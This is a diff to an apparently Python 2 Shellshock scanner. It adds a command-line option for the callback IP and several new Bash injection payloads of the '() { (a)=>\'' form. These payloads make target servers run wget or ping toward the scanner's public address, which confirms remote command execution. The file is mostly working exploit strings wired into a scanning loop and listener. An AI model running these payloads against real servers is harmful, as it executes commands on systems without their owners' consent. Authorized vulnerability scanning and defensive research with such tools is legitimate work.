@@ -18,7 +18,7 @@ local_ip = socket.gethostbyname(socket.gethostname())
 
 ####GOTTA SET THESE!!!
 local_ip = "0.0.0.0"
-public_ip = "-----"
+#public_ip = "-----"
 local_port = 80
 https_port = 443
 ids = {}
@@ -63,7 +63,14 @@ def test_ip(ip_address, identifier):
 			   "() { :; }; ping -c 6 " + public_ip,
 			   "() { :; }; /usr/ping -c 6 " + public_ip,
 			   "() { :; }; /bin/bash -c 'ping -c 6 " + public_ip + "'",
-			   "() { :; }; /bin/bash -c '/usr/ping -c 6 " + public_ip + "'" ]
+			   "() { :; }; /bin/bash -c '/usr/ping -c 6 " + public_ip + "'",
+			   "'() { (a)=>\' wget http://" + public_ip + "/" + identifier + " >> /dev/null",
+			   "'() { (a)=>\' /usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null",
+			   "'() { (a)=>\' /bin/bash -c 'wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
+			   "'() { (a)=>\' ping -c 6 " + public_ip,
+			   "'() { (a)=>\' /usr/ping -c 6 " + public_ip,
+			   "'() { (a)=>\' /bin/bash -c 'ping -c 6 " + public_ip + "'",
+			   "'() { (a)=>\' /bin/bash -c '/usr/ping -c 6 " + public_ip + "'"]
 	
 	
 	for exploit_str in list_of_exp_str:
@@ -121,9 +128,9 @@ def main():
 		usage()
 		sys.exit()
 
-	if public_ip == "-----":
-		print "Must set public_ip in script"
-		exit()
+	#if public_ip == "-----":
+	#	print "Must set public_ip using -p"
+	#	exit()
 		
 	#Get all our opts in place.
 	for o, a in opts:
@@ -132,12 +139,18 @@ def main():
 			return
 		elif o == "-i":
 			input_filename = a
+		elif o == "-p":
+			public_ip = a
 		elif o == "-o":
 			output_filename = a
 
 	if input_filename == "" or output_filename == "":
 		usage()
 		return
+
+	if public_ip == "-----":
+                print "Must set public_ip using -p"
+                exit()
 
 	input_file = open(input_filename,"r")
 	output_file = open(output_filename,"w")
@@ -152,6 +165,7 @@ def main():
 	server.daemon=True
 	server.start();
 	print "ShellShock Scan Listener started on %s:%s" % (local_ip,local_port)
+	print "Expecting connections to public address %s" % (public_ip)
 	
 	
 	
@@ -173,4 +187,5 @@ def main():
 	print("Shutting down server")
 	httpd.shutdown
 
+public_ip = "-----"
 main()
